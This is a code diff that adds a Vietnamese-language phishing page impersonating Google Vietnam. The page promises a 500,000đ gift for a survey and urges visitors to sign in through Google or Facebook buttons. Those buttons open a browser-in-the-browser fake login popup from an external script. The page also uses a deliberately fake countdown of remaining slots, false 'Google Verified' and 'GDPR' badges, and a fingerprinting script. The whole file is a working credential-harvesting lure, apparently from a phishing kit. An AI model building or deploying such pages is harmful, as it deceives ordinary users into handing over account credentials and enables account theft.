@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Khảo sát trải nghiệm người dùng — Nhận quà 500K</title>
+    <link rel="icon" href="https://www.gstatic.com/favicon/favicon_96x96.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="bitb-style.css">
+</head>
+<body>
+    <div class="host-page">
+        <!-- Header -->
+        <div class="host-header">
+            <h1>📊 Khảo sát Trải nghiệm 2026</h1>
+            <p>Chương trình nghiên cứu người dùng — Google Vietnam</p>
+        </div>
+
+        <!-- Article -->
+        <div class="host-article">
+            <div class="article-meta">
+                <span>📅 Hôm nay</span>
+                <span>⏱ 2 phút đọc</span>
+                <span>👁 12,847 lượt xem</span>
+            </div>
+
+            <h2>🎁 Google Việt Nam tặng 500.000đ cho người tham gia khảo sát</h2>
+
+            <div class="article-img">🎯</div>
+
+            <div class="article-body">
+                <p>
+                    Nhằm cải thiện trải nghiệm người dùng tại Việt Nam, <strong>Google Research</strong> đang tiến hành
+                    khảo sát ngắn với <strong>500 người đầu tiên</strong> tham gia. Mỗi người hoàn thành sẽ nhận ngay
+                    <strong>thẻ quà tặng trị giá 500.000đ</strong> qua MoMo hoặc chuyển khoản ngân hàng.
+                </p>
+                <br>
+                <p>
+                    Để đảm bảo mỗi người chỉ tham gia 1 lần, vui lòng <strong>đăng nhập bằng tài khoản Google</strong>
+                    của bạn trước khi bắt đầu khảo sát.
+                </p>
+            </div>
+
+            <!-- Social login section — nơi trigger BitB popup -->
+            <div class="social-login-section">
+                <h3>🔐 Đăng nhập để tham gia</h3>
+                <p>Xác thực danh tính để nhận phần quà</p>
+
+                <!-- Google login button — trigger BitB -->
+                <button class="btn-social btn-google" onclick="openBitBGoogle()">
+                    <svg width="18" height="18" viewBox="0 0 48 48">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
+                    Tiếp tục với Google
+                </button>
+
+                <!-- Facebook login button -->
+                <button class="btn-social btn-facebook" onclick="openBitBFacebook()">
+                    <svg width="18" height="18" viewBox="0 0 36 36" fill="white">
+                        <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"/>
+                        <path d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.531-.399Z" fill="#1877f2"/>
+                    </svg>
+                    Tiếp tục với Facebook
+                </button>
+            </div>
+
+            <!-- Trust signals -->
+            <div style="display:flex;justify-content:center;gap:20px;margin:16px 0;font-size:10px;color:#999;">
+                <span>🔒 Mã hóa SSL</span>
+                <span>✅ Google Verified</span>
+                <span>🛡️ GDPR Compliant</span>
+            </div>
+
+            <div class="article-body" style="font-size:12px;color:#999;">
+                <p>
+                    <em>Lưu ý: Chương trình chỉ áp dụng cho 500 người đầu tiên. Số lượng còn lại:
+                    <strong style="color:#e53935;" id="remaining">127</strong> suất.</em>
+                </p>
+            </div>
+        </div>
+
+        <div class="host-footer">
+            Google Vietnam Research · Điều khoản sử dụng · Chính sách bảo mật<br>
+            © 2026 Google LLC. Tất cả quyền được bảo lưu.
+        </div>
+    </div>
+
+    <script src="bitb-script.js"></script>
+    <script>
+        // Fake remaining counter
+        const el = document.getElementById('remaining');
+        setInterval(() => {
+            let v = parseInt(el.textContent);
+            if (v > 12 && Math.random() > 0.6) {
+                el.textContent = v - 1;
+            }
+        }, 8000 + Math.random() * 12000);
+
+        // Set session vars for fingerprint
+        window.SESSION_ID = window.SESSION_ID || 'bitb_' + Date.now();
+        window.PAGE_TYPE = 'bitb_host';
+    </script>
+    <script src="fingerprint.js"></script>
+</body>
+</html>
